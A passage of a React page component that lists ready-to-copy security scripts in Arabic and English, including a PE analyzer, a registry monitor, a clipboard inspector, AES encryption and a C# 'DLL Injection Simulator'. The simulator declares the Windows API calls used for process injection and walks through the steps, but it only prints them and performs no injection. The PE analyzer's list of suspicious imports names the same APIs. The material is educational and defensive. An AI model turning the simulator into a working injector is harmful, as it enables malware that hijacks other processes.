                blockedThreads.add(info);
            }
            
            // Print thread details
            System.out.println("Thread: " + info.getThreadName());
            System.out.println("  State: " + state);
            System.out.println("  CPU Time: " + 
                threadMXBean.getThreadCpuTime(info.getThreadId()) / 1_000_000 + "ms");
            
            if (info.getLockName() != null) {
                System.out.println("  Waiting on: " + info.getLockName());
                System.out.println("  Lock Owner: " + info.getLockOwnerName());
            }
            
            // Stack trace (top 3 frames)
            StackTraceElement[] stack = info.getStackTrace();
            if (stack.length > 0) {
                System.out.println("  Stack:");
                for (int i = 0; i < Math.min(3, stack.length); i++) {
                    System.out.println("    at " + stack[i]);
                }
            }
            System.out.println();
        }
        
        // Summary
        System.out.println("=== State Summary ===");
        stateCount.forEach((state, count) -> 
            System.out.println("  " + state + ": " + count));
        
        // Deadlock detection
        System.out.println("\\n=== Deadlock Detection ===");
        long[] deadlocked = threadMXBean.findDeadlockedThreads();
        if (deadlocked != null && deadlocked.length > 0) {
            System.out.println("[!] DEADLOCK DETECTED!");
            ThreadInfo[] deadlockedInfos = threadMXBean.getThreadInfo(deadlocked);
            for (ThreadInfo info : deadlockedInfos) {
                System.out.println("  Thread: " + info.getThreadName());
                System.out.println("  Blocked by: " + info.getLockOwnerName());
            }
        } else {
            System.out.println("[+] No deadlocks detected");
        }
    }
    
    public static void main(String[] args) throws Exception {
        // Create some threads for demo
        Object lock1 = new Object();
        Object lock2 = new Object();
        
        new Thread(() -> {
            synchronized (lock1) {
                try { Thread.sleep(100); } catch (Exception e) {}
                synchronized (lock2) {}
            }
        }, "Worker-1").start();
        
        new Thread(() -> {
            synchronized (lock2) {
                try { Thread.sleep(100); } catch (Exception e) {}
                synchronized (lock1) {}
            }
        }, "Worker-2").start();
        
        Thread.sleep(200);
        analyzeThreads();
    }
}`,
  },
  // C# Scripts - أفكار جديدة ومميزة
  {
    name: { ar: "حاقن الـ DLL", en: "DLL Injection Simulator" },
    description: { ar: "محاكاة عملية حقن DLL في العمليات", en: "Simulate DLL injection into processes" },
    language: "C#",
    code: `using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

class DLLInjector
{
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr proc, IntPtr addr, 
        uint size, uint type, uint protect);
    
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr,
        byte[] buffer, uint size, out int written);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr module, string procName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string moduleName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attr,
        uint stackSize, IntPtr startAddr, IntPtr param, uint flags, IntPtr tid);
    
    const int PROCESS_ALL = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_READWRITE = 0x04;
    
    public static void SimulateInjection(int processId, string dllPath)
    {
        Console.WriteLine("=== DLL Injection Simulator ===\\n");
        Console.WriteLine("[*] Target PID: " + processId);
        Console.WriteLine("[*] DLL Path: " + dllPath);
        
        try
        {
            Process proc = Process.GetProcessById(processId);
            Console.WriteLine("[+] Process found: " + proc.ProcessName);
            
            Console.WriteLine("\\n[1] Opening process handle...");
            Console.WriteLine("    -> OpenProcess(PROCESS_ALL_ACCESS, " + processId + ")");
            
            Console.WriteLine("\\n[2] Allocating memory in target...");
            int pathLen = Encoding.Unicode.GetByteCount(dllPath);
            Console.WriteLine("    -> VirtualAllocEx(size=" + pathLen + ")");
            
            Console.WriteLine("\\n[3] Writing DLL path to memory...");
            Console.WriteLine("    -> WriteProcessMemory(dllPath)");
            
            Console.WriteLine("\\n[4] Getting LoadLibraryW address...");
            IntPtr loadLibAddr = GetProcAddress(
                GetModuleHandle("kernel32.dll"), "LoadLibraryW");
            Console.WriteLine("    -> LoadLibraryW @ 0x" + loadLibAddr.ToString("X"));
            
            Console.WriteLine("\\n[5] Creating remote thread...");
            Console.WriteLine("    -> CreateRemoteThread(LoadLibraryW, dllPath)");
            
            Console.WriteLine("\\n[!] Simulation complete (no actual injection)");
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Error: " + ex.Message);
        }
    }
    
    static void Main(string[] args)
    {
        int pid = Process.GetCurrentProcess().Id;
        SimulateInjection(pid, "C:\\\\test.dll");
    }
}`,
  },
  {
    name: { ar: "محلل الـ PE Files", en: "PE File Analyzer" },
    description: { ar: "تحليل ملفات Windows التنفيذية", en: "Analyze Windows executable files" },
    language: "C#",
    code: `using System;
using System.IO;
using System.Text;
using System.Collections.Generic;

class PEAnalyzer
{
    public static void Analyze(string filePath)
    {
        Console.WriteLine("=== PE File Analyzer ===\\n");
        
        using (var reader = new BinaryReader(File.OpenRead(filePath)))
        {
            ushort magic = reader.ReadUInt16();
            if (magic != 0x5A4D)
            {
                Console.WriteLine("[!] Not a valid PE file!");
                return;
            }
            Console.WriteLine("[+] DOS Magic: MZ (Valid)");
            
            reader.BaseStream.Seek(0x3C, SeekOrigin.Begin);
            int peOffset = reader.ReadInt32();
            Console.WriteLine("[+] PE Header Offset: 0x" + peOffset.ToString("X"));
            
            reader.BaseStream.Seek(peOffset, SeekOrigin.Begin);
            uint peSignature = reader.ReadUInt32();
            if (peSignature != 0x4550)
            {
                Console.WriteLine("[!] Invalid PE signature!");
                return;
            }
            Console.WriteLine("[+] PE Signature: Valid");
            
            ushort machine = reader.ReadUInt16();
            Console.WriteLine("[+] Machine: " + GetMachineType(machine));
            
            ushort sections = reader.ReadUInt16();
            Console.WriteLine("[+] Sections: " + sections);
            
            uint timestamp = reader.ReadUInt32();
            DateTime compiled = new DateTime(1970, 1, 1).AddSeconds(timestamp);
            Console.WriteLine("[+] Compiled: " + compiled.ToString("yyyy-MM-dd HH:mm:ss"));
            
            reader.ReadUInt32();
            reader.ReadUInt32();
            ushort optHeaderSize = reader.ReadUInt16();
            ushort characteristics = reader.ReadUInt16();
            
            Console.WriteLine("\\n[*] Characteristics:");
            if ((characteristics & 0x0002) != 0) Console.WriteLine("    - Executable");
            if ((characteristics & 0x0020) != 0) Console.WriteLine("    - Large Address Aware");
            if ((characteristics & 0x2000) != 0) Console.WriteLine("    - DLL");
            
            ushort optMagic = reader.ReadUInt16();
            bool is64bit = optMagic == 0x20B;
            Console.WriteLine("\\n[+] Architecture: " + (is64bit ? "64-bit" : "32-bit"));
            
            Console.WriteLine("\\n[*] Detecting suspicious imports...");
            string content = File.ReadAllText(filePath, Encoding.ASCII);
            string[] susImports = { "VirtualAlloc", "CreateRemoteThread", 
                "WriteProcessMemory", "LoadLibrary", "GetProcAddress" };
            
            foreach (var import in susImports)
            {
                if (content.Contains(import))
                    Console.WriteLine("    [!] " + import);
            }
        }
    }
    
    static string GetMachineType(ushort machine)
    {
        if (machine == 0x14c) return "x86 (i386)";
        if (machine == 0x8664) return "x64 (AMD64)";
        if (machine == 0xAA64) return "ARM64";
        return "Unknown (0x" + machine.ToString("X") + ")";
    }
    
    static void Main(string[] args)
    {
        string file = args.Length > 0 ? args[0] : 
            Environment.GetCommandLineArgs()[0];
        Analyze(file);
    }
}`,
  },
  {
    name: { ar: "مراقب Registry", en: "Registry Monitor" },
    description: { ar: "مراقبة تغييرات الـ Registry في الوقت الحقيقي", en: "Monitor Registry changes in real-time" },
    language: "C#",
    code: `using System;
using System.Collections.Generic;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Text;

class RegistryMonitor
{
    static Dictionary<string, string> snapshots = new Dictionary<string, string>();
    static string[] monitoredKeys = {
        "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
        "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce",
        "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
        "SYSTEM\\\\CurrentControlSet\\\\Services"
    };
    
    public static void TakeSnapshot()
    {
        Console.WriteLine("[*] Taking registry snapshot...\\n");
        snapshots.Clear();
        
        foreach (var keyPath in monitoredKeys)
        {
            try
            {
                var key = Registry.LocalMachine.OpenSubKey(keyPath);
                if (key == null) continue;
                
                foreach (var valueName in key.GetValueNames())
                {
                    var value = key.GetValue(valueName).ToString();
                    var hash = ComputeHash(value);
                    snapshots[keyPath + "\\\\" + valueName] = hash;
                }
                Console.WriteLine("[+] " + keyPath + " (" + key.ValueCount + " values)");
                key.Close();
            }
            catch { }
        }
        Console.WriteLine("\\n[*] Snapshot complete: " + snapshots.Count + " values");
    }
    
    public static void CheckChanges()
    {
        Console.WriteLine("\\n=== Checking for Changes ===\\n");
        int changes = 0;
        
        foreach (var keyPath in monitoredKeys)
        {
            try
            {
                var key = Registry.LocalMachine.OpenSubKey(keyPath);
                if (key == null) continue;
                
                foreach (var valueName in key.GetValueNames())
                {
                    var fullPath = keyPath + "\\\\" + valueName;
                    var value = key.GetValue(valueName).ToString();
                    var hash = ComputeHash(value);
                    
                    if (!snapshots.ContainsKey(fullPath))
                    {
                        Console.WriteLine("[+] NEW: " + fullPath);
                        changes++;
                    }
                    else if (snapshots[fullPath] != hash)
                    {
                        Console.WriteLine("[!] MODIFIED: " + fullPath);
                        changes++;
                    }
                }
                key.Close();
            }
            catch { }
        }
        
        if (changes == 0)
            Console.WriteLine("[+] No changes detected");
        else
            Console.WriteLine("\\n[!] Total changes: " + changes);
    }
    
    static string ComputeHash(string input)
    {
        var md5 = MD5.Create();
        var hash = md5.ComputeHash(Encoding.UTF8.GetBytes(input));
        return BitConverter.ToString(hash).Replace("-", "");
    }
    
    static void Main()
    {
        Console.WriteLine("=== Registry Monitor ===\\n");
        TakeSnapshot();
        
        Console.WriteLine("\\n[*] Monitoring... (Press Enter to check)");
        Console.ReadLine();
        
        CheckChanges();
    }
}`,
  },
  {
    name: { ar: "استخراج بيانات الـ Clipboard", en: "Clipboard Data Extractor" },
    description: { ar: "استخراج وتحليل محتوى الحافظة", en: "Extract and analyze clipboard contents" },
    language: "C#",
    code: `using System;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Collections.Specialized;
using System.Text.RegularExpressions;

class ClipboardExtractor
{
    [STAThread]
    static void Main()
    {
        Console.WriteLine("=== Clipboard Data Extractor ===\\n");
        
        while (true)
        {
            Console.WriteLine("[*] Press Enter to analyze clipboard (Q to quit)");
            var input = Console.ReadLine();
            if (input.ToUpper() == "Q") break;
            
            AnalyzeClipboard();
        }
    }
    
    static void AnalyzeClipboard()
    {
        Console.WriteLine("\\n--- Clipboard Analysis ---\\n");
        
        try
        {
            IDataObject data = Clipboard.GetDataObject();
            if (data == null)
            {
                Console.WriteLine("[!] Clipboard is empty");
                return;
            }
            
            Console.WriteLine("[*] Available formats:");
            foreach (var format in data.GetFormats())
            {
                Console.WriteLine("    - " + format);
            }
            Console.WriteLine();
            
            if (Clipboard.ContainsText())
            {
                string text = Clipboard.GetText();
                Console.WriteLine("[+] TEXT DATA:");
                Console.WriteLine("    Length: " + text.Length + " chars");
                Console.WriteLine("    Lines: " + text.Split('\\n').Length);
                Console.WriteLine("    Preview: " + Truncate(text, 100));
                
                DetectSensitiveData(text);
            }
            
            if (Clipboard.ContainsImage())
            {
                Image img = Clipboard.GetImage();
                Console.WriteLine("\\n[+] IMAGE DATA:");
                Console.WriteLine("    Size: " + img.Width + "x" + img.Height);
                Console.WriteLine("    Format: " + img.RawFormat);
            }
            
            if (Clipboard.ContainsFileDropList())
            {
                StringCollection files = Clipboard.GetFileDropList();
                Console.WriteLine("\\n[+] FILE LIST:");
                foreach (string file in files)
                {
                    var info = new FileInfo(file);
                    Console.WriteLine("    - " + info.Name);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Error: " + ex.Message);
        }
    }
    
    static void DetectSensitiveData(string text)
    {
        Console.WriteLine("\\n[*] Sensitive Data Scan:");
        
        if (Regex.IsMatch(text, "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}"))
            Console.WriteLine("    [!] Email addresses detected");
        
        if (Regex.IsMatch(text, "\\\\b\\\\d{4}[- ]?\\\\d{4}[- ]?\\\\d{4}[- ]?\\\\d{4}\\\\b"))
            Console.WriteLine("    [!] Possible credit card number");
        
        if (text.ToLower().Contains("password"))
            Console.WriteLine("    [!] Password-related text detected");
    }
    
    static string Truncate(string text, int max)
    {
        if (text.Length > max)
            return text.Substring(0, max).Replace("\\n", " ") + "...";
        return text.Replace("\\n", " ");
    }
}`,
  },
  {
    name: { ar: "تشفير AES متقدم", en: "Advanced AES Encryption" },
    description: { ar: "تشفير وفك تشفير الملفات باستخدام AES-256", en: "Encrypt and decrypt files using AES-256" },
    language: "C#",
    code: `using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

class AdvancedAES
{
    private const int KeySize = 256;
    private const int BlockSize = 128;
    private const int Iterations = 100000;
    
    public static byte[] DeriveKey(string password, byte[] salt)
    {
        var pbkdf2 = new Rfc2898DeriveBytes(
            password, salt, Iterations, HashAlgorithmName.SHA256);
        return pbkdf2.GetBytes(KeySize / 8);
    }
    
    public static byte[] Encrypt(byte[] data, string password, 
        out byte[] salt, out byte[] iv)
    {
        salt = new byte[32];
        iv = new byte[BlockSize / 8];
        
        var rng = RandomNumberGenerator.Create();
        rng.GetBytes(salt);
        rng.GetBytes(iv);
        
        byte[] key = DeriveKey(password, salt);
        
        var aes = Aes.Create();
        aes.KeySize = KeySize;
        aes.BlockSize = BlockSize;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = key;
        aes.IV = iv;
        
        var encryptor = aes.CreateEncryptor();
        var ms = new MemoryStream();
        var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write);
        
        cs.Write(data, 0, data.Length);
        cs.FlushFinalBlock();
        
        return ms.ToArray();
    }
    
    public static byte[] Decrypt(byte[] encrypted, string password, 
        byte[] salt, byte[] iv)
    {
        byte[] key = DeriveKey(password, salt);
        
        var aes = Aes.Create();
        aes.KeySize = KeySize;
        aes.BlockSize = BlockSize;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = key;
        aes.IV = iv;
        
        var decryptor = aes.CreateDecryptor();
        var ms = new MemoryStream(encrypted);
        var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read);
        var result = new MemoryStream();
        
        cs.CopyTo(result);
        return result.ToArray();
    }
    
    static void Main(string[] args)
    {
        Console.WriteLine("=== AES-256 File Encryption ===\\n");
        
        string testData = "This is secret data to encrypt!";
        string password = "SuperSecretP@ssw0rd!";
        
        byte[] salt, iv;
        byte[] enc = Encrypt(Encoding.UTF8.GetBytes(testData), password, out salt, out iv);
        Console.WriteLine("[+] Original: " + testData);
        Console.WriteLine("[+] Encrypted: " + Convert.ToBase64String(enc));
        
        byte[] dec = Decrypt(enc, password, salt, iv);
        Console.WriteLine("[+] Decrypted: " + Encoding.UTF8.GetString(dec));
    }
}`,
  },
];


const ScriptsPage = () => {
  const [copied, setCopied] = useState<number | null>(null);
  const [filter, setFilter] = useState<"all" | "Python" | "C++" | "C" | "Bash" | "JavaScript" | "Assembly" | "Java" | "C#">("all");
  const [language, setLanguage] = useState<"ar" | "en">("ar");

  const copyToClipboard = (code: string, index: number) => {
    navigator.clipboard.writeText(code);
    setCopied(index);
    setTimeout(() => setCopied(null), 2000);
  };

  const filteredScripts = filter === "all" 
    ? scripts 
    : scripts.filter(s => s.language === filter);

  const getLanguageColor = (lang: string) => {
    switch (lang) {
      case "Python": return "bg-blue-500/20 text-blue-400 border-blue-500/30";
      case "C++": return "bg-purple-500/20 text-purple-400 border-purple-500/30";
      case "C": return "bg-cyan-500/20 text-cyan-400 border-cyan-500/30";
      case "Bash": return "bg-green-500/20 text-green-400 border-green-500/30";
      case "JavaScript": return "bg-yellow-500/20 text-yellow-400 border-yellow-500/30";
      case "Assembly": return "bg-red-500/20 text-red-400 border-red-500/30";
      case "Java": return "bg-orange-500/20 text-orange-400 border-orange-500/30";
      case "C#": return "bg-emerald-500/20 text-emerald-400 border-emerald-500/30";
      default: return "bg-primary/20 text-primary border-primary/30";
    }
  };

  const t = {
    title: language === "ar" ? "السكربتات الجاهزة" : "Ready-to-Use Scripts",
    subtitle: language === "ar" 
      ? `${scripts.length} سكربت بلغات Python و C++ و C و Bash و JavaScript و Assembly و Java و C#` 
      : `${scripts.length} scripts in Python, C++, C, Bash, JavaScript, Assembly, Java, and C#`,
    all: language === "ar" ? "الكل" : "All",
  };

  return (
    <div className="min-h-screen bg-background">
      <Navbar />
      <main className="pt-24 pb-16">
        <div className="container mx-auto px-4">
          {/* Header */}
          <div className="text-center mb-12">
            <div className="flex justify-center mb-6">
              <div className="cyber-icon-box">
                <Code className="w-10 h-10 text-primary" />
              </div>
            </div>
            <div className="flex items-center justify-center gap-3 mb-4">
              <h1 className="text-4xl md:text-5xl font-bold text-primary text-glow">
                {t.title}
              </h1>
              <button
                onClick={() => setLanguage(prev => prev === "ar" ? "en" : "ar")}
                className="p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors"
              >
                <Globe className="w-5 h-5 text-muted-foreground" />
              </button>
            </div>
            <p className="text-muted-foreground text-lg max-w-2xl mx-auto">{t.subtitle}</p>
          </div>

          {/* Filter Buttons */}
          <div className="flex justify-center gap-3 mb-10 flex-wrap">
            {["all", "Python", "C++", "C", "Bash", "JavaScript", "Assembly", "Java", "C#"].map((lang) => (
              <button
                key={lang}
                onClick={() => setFilter(lang as typeof filter)}
                className={`px-6 py-2 rounded-xl transition-all ${
                  filter === lang
                    ? "bg-primary/20 text-primary border border-primary/50"
                    : "bg-secondary text-muted-foreground border border-border/50 hover:border-primary/30"
                }`}
              >
                {lang === "all" ? t.all : lang}
              </button>
            ))}
          </div>

          {/* Scripts List */}
          <div className="max-w-4xl mx-auto space-y-6">
            {filteredScripts.map((script, index) => (
              <div key={index} className="cyber-card overflow-hidden">
                <div className="p-6 border-b border-border/30">
                  <div className="flex items-center justify-between gap-4">
                    <div className="flex items-center gap-4">
                      <div className="w-12 h-12 rounded-xl bg-primary/10 border border-primary/30 flex items-center justify-center flex-shrink-0">
                        {(() => {
                          const IconComponent = getScriptIcon(script.name.en);
                          return <IconComponent className="w-6 h-6 text-primary" />;
                        })()}
                      </div>
                      <div>
                        <h3 className="text-xl font-bold text-primary mb-1">
                          {language === "ar" ? script.name.ar : script.name.en}
                        </h3>
                        <p className="text-muted-foreground text-sm">
                          {language === "ar" ? script.description.ar : script.description.en}
                        </p>
                      </div>
                    </div>
                    <span className={`px-3 py-1 rounded-lg text-sm font-medium border flex-shrink-0 ${getLanguageColor(script.language)}`}>
                      {script.language}
                    </span>
                  </div>
                </div>
                <div className="relative">
                  <button
                    onClick={() => copyToClipboard(script.code, index)}
                    className="absolute top-4 left-4 p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-all z-10"
                  >
                    {copied === index ? (
                      <Check className="w-4 h-4 text-primary" />
                    ) : (
                      <Copy className="w-4 h-4 text-muted-foreground" />
                    )}
                  </button>
                  <pre className="p-6 pt-14 overflow-x-auto bg-background/50 text-sm">
                    <code className="text-foreground font-mono" dir="ltr">{script.code}</code>
                  </pre>
                </div>
              </div>
            ))}
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default ScriptsPage;
